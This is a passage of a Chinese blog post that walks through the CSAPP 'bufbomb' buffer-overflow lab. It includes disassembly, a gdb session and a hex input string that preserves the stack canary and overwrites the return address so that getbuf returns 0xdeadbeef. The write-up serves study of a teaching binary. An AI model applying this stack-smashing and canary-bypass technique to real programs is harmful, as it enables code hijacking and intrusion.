55 f4&nbsp;<span class="Apple-tab-span" style="white-space:pre">		</span><span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 204); ">-</span>0xc<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">edx</span><br style="font-size: 10pt; ">80485b7<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;65 33 15 14 00 00 00&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 255); ">xor</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>%<span style="color: rgb(255, 0, 0); ">gs</span><span style="color: rgb(0, 0, 204); ">:</span>0x14<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">edx</span><br style="font-size: 10pt; ">80485be<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;74 05&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">je</span>&nbsp;&nbsp; &nbsp; &nbsp;80485c5&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>getbuf<span style="color: rgb(0, 0, 204); ">+</span>0x32<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485c0<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;e8 3b fe ff ff&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 255); ">call</span>&nbsp;&nbsp; &nbsp;8048400&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>__stack_chk_fail@plt<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485c5<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;c9&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">leave</span>&nbsp;<br style="font-size: 10pt; ">80485c6<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;c3&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">ret</span>&nbsp;</span></code></p></td></tr></tbody></table></span></font><font size="3" style="line-height: normal; "><font class="Apple-style-span" color="#00FF00"><span class="Apple-style-span" style="font-size: medium;"><br></span></font>在此段汇编代码中，我们可以发现如下部分：</font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-style-span" style="font-size: medium;"><br></span></font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-style-span" style="font-size: medium;"><span class="Apple-style-span" style="color: rgb(0, 0, 0); font-family: 'Courier New', Courier, 宋体; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; font-size: 12px; "><table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999" width="95%" bgcolor="#F1F1F1" style="border-collapse: collapse; "><tbody><tr style="font-size: 10pt; "><td style="font-size: 10pt; "><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; "><code><span style="color: rgb(0, 0, 0); ">8048596<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;83 ec 28&nbsp;<span style="color: rgb(0, 0, 255); ">sub</span>&nbsp;$0x28<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span>esp<br style="font-size: 10pt; ">80485a4<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;8d 45 e8&nbsp;<span style="color: rgb(0, 0, 255); ">lea</span>&nbsp;<span style="color: rgb(0, 0, 204); ">-</span>0x18<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">8048599<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;65 a1 14 00 00 00&nbsp;<span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;%<span style="color: rgb(255, 0, 0); ">gs</span><span style="color: rgb(0, 0, 204); ">:</span>0x14<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span></span></code></p></td></tr></tbody></table></span></span><span class="Apple-style-span" style="color: rgb(0, 255, 0); ">&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</span><br></font><font size="3" style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>这里是说getbuf申请了40个字节的堆栈空间，而C程序说表示的数组buf是从当前基址偏移24个字节开始俄。然而，负责缓冲区溢出的gs验证从偏移12个字节的地址开始。<br style="line-height: normal; "></font><font size="3" style="line-height: normal; "><br></font></span></div><table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999" width="95%" bgcolor="#F1F1F1" style="border-collapse: collapse; "><tbody><tr style="font-size: 10pt; "><td style="font-size: 10pt; "><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; "><code><span style="color: rgb(0, 0, 0); ">080485c7&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(0, 0, 255); ">test</span><span style="color: rgb(0, 0, 204); ">&gt;</span><span style="color: rgb(0, 0, 204); ">:</span><br style="font-size: 10pt; ">80485c7<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;55&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">			</span><span style="color: rgb(0, 0, 255); ">push<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%<span style="color: rgb(255, 0, 0); ">ebp</span><br style="font-size: 10pt; ">80485c8<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 e5&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">			</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%esp<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><br style="font-size: 10pt; ">80485ca<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;83 ec 28&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">sub<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;$0x28<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span>esp<br style="font-size: 10pt; ">80485cd<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;b8 30 87 04 08&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">	</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;$0x8048730<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">80485d2<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 04 24&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span>esp<span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485d5<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;e8 16 fe ff ff&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">	</span><span style="color: rgb(0, 0, 255); ">call<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;80483f0&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>printf@plt<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485da<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;e8 b4 ff ff ff&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">	</span><span style="color: rgb(0, 0, 255); ">call<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;8048593&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>getbuf<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485df<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 45 f4&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">-</span>0xc<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485e2<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;b8 41 87 04 08&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">	</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;$0x8048741<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">80485e7<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;8b 55 f4<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;<span style="color: rgb(0, 0, 204); ">-</span>0xc<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">edx</span><br style="font-size: 10pt; ">80485ea<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 54 24 04&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%<span style="color: rgb(255, 0, 0); ">edx</span><span style="color: rgb(0, 0, 204); ">,</span>0x4<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span>esp<span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485ee<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 04 24&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">		</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span>esp<span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485f1<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;e8 fa fd ff ff&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">	</span><span style="color: rgb(0, 0, 255); ">call<span class="Apple-tab-span" style="white-space: pre; ">	</span></span>&nbsp;80483f0&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>printf@plt<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485f6<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;c9&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">			</span><span style="color: rgb(0, 0, 255); ">leave</span>&nbsp;<br style="font-size: 10pt; ">80485f7<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;c3&nbsp;<span class="Apple-tab-span" style="white-space: pre; ">			</span><span style="color: rgb(0, 0, 255); ">ret</span>&nbsp;<br style="font-size: 10pt; "></span></code></p></td></tr></tbody></table><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><br></font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getbuf（）返回之后，调用了printf输出getbuf的返回值。而在以上代码中我们可以看出printf（）的调用过程，首先设置参数个数，然后对输出内容压栈，再对输出格式压栈，之后调用printf。<br style="line-height: normal; "><br style="line-height: normal; ">&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>所以到此已经能够构思出要实现的方式：输入字符串填充缓冲区，对gs：0x14进行验证，再将getbuf的地址写入缓冲区溢出的队列，再将getbuf返回地址改成printf的调用地址，跟上printf的参数设置，最后就是咱们要让他输出的数字。<br style="line-height: normal; ">基本格式如下<br style="line-height: normal; "><br style="line-height: normal; ">任意十二个字节的编码――&gt;%gs:0x14――&gt;任意8个字节的编码――&gt;getbuf栈帧基址――&gt;printf()的地址―――&gt;格式参数――――&gt;输出内容ef be ad be （十六进制数字序列deadbeef在小端法字节序的机器上的表示）。<br style="line-height: normal; "><br style="line-height: normal; ">具体做法：<br style="line-height: normal; "><br></font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><br></font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-style-span" style="color: rgb(0, 0, 0); font-family: 'Courier New', Courier, 宋体; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; font-size: 12px; "><table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999" width="95%" bgcolor="#F1F1F1" style="border-collapse: collapse; "><tbody><tr style="font-size: 10pt; "><td style="font-size: 10pt; "><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">Pigsy.Beard@Pigsy.Beard-thinkpad&gt; ~/CSAPP $ gdb bufbomb GNU gdb (GDB) 7.0-ubuntu Copyright (C) 2009 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type "show copying" and "show warranty" for details. This GDB was configured as "i486-linux-gnu". For bug reporting instructions, please see: &lt;http://www.gnu.org/software/gdb/bugs/&gt;... Reading symbols from /home/Pigsy.Beard/CSAPP/bufbomb...done.&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">(gdb) b 40&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">Breakpoint 1 at 0x80485a4: file bufbomb.c, line 40.&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">(gdb) r Starting program: /home/Pigsy.Beard/CSAPP/bufbomb Breakpoint 1, getbuf () at bufbomb.c:41 41 getxs(buf);&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">(gdb) x /wa ($ebp-12) 0xbfffef9c: 0x98d4d600&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">(gdb) x /wa $ebp 0xbfffefa8: 0xbfffefd8&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">(gdb) c Continuing.&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">Type Hex string:00 00 00 00 00 00 00 00 00 00 00 00 00 d6 d4 98 00 00 00 00 00 00 00 00 d8 ef ff bf f1 85 04 08 41 87 04 08 ef be ad be&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">getbuf returned 0xbeadbeef&nbsp;</p><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; ">Program exited normally.</p></td></tr></tbody></table></span><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>在这里00 00 00 00 00 00 00 00 00 00 00 00</font>&nbsp;<font color="#ff0000" size="3" style="line-height: normal; ">00 d6 d4 98</font><font size="3" style="line-height: normal; ">&nbsp;00 00 00 00 00 00 00 00 d8 ef ff bf f1 85 04 08 41 87 04 08 ef be ad be就是最终输入的字符，其中</font><font color="#ff0000" size="3" style="line-height: normal; ">00 d6 d4 98<font color="#000000" style="line-height: normal; ">是</font></font><font size="3" style="line-height: normal; ">gs缓冲区溢出检验的随机码，每次运行都会有不同，其余字符基本不变化（目前看来是这样的）。<br style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>以上就是成功的过程，之前失败的经历也很多。主要是在网上看到了别人的一些做法，直接套用导致的。他们的好多做法之中，有的直接运行编译之后的可执行文件，输入攻击即可。对此查阅了相关资料发现自GCC-4.1.0之后，就在编译过程中加入了防溢出的随机数验证机制，在%gs:0x14 中保存一个随机数，用此进行比对，验证溢出与否。同时GCC-4.1.0之后还加入了与溢出有关的几个编译选项，以此控制是否添加溢出验证：<br style="line-height: normal; "><br style="line-height: normal; ">-fstack-protector：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。</font><p style="line-height: normal; "><font size="3" style="line-height: normal; ">-fstack-protector-all：启用堆栈保护，为所有函数插入保护代码。</font></p><p style="line-height: normal; "><font size="3" style="line-height: normal; ">-fno-stack-protector：禁用堆栈保护。</font></p><p style="line-height: normal; "><font size="3" style="line-height: normal; ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当然，是否实现溢出，不仅与编译器有关，还有系统内核的机制有关。在此我也没有搞得特别清楚，不能妄加评点。</font></p><p style="line-height: normal; "><font size="3" style="line-height: normal; ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 总之，总结本次实验的经验与此，供需要者取用。欢迎探讨～～！</font></p><p style="line-height: normal; "><font size="3" style="line-height: normal; ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 最后，感慨再一下GCC的力量，再拜谢以下盛剑神力～～！</font></p></span></div><br>]]></CONTENT>
		</ATRICLE>
		<COMMENTS>
</COMMENTS>

<CREATETIME>0.07633</CREATETIME>
</BLOG>
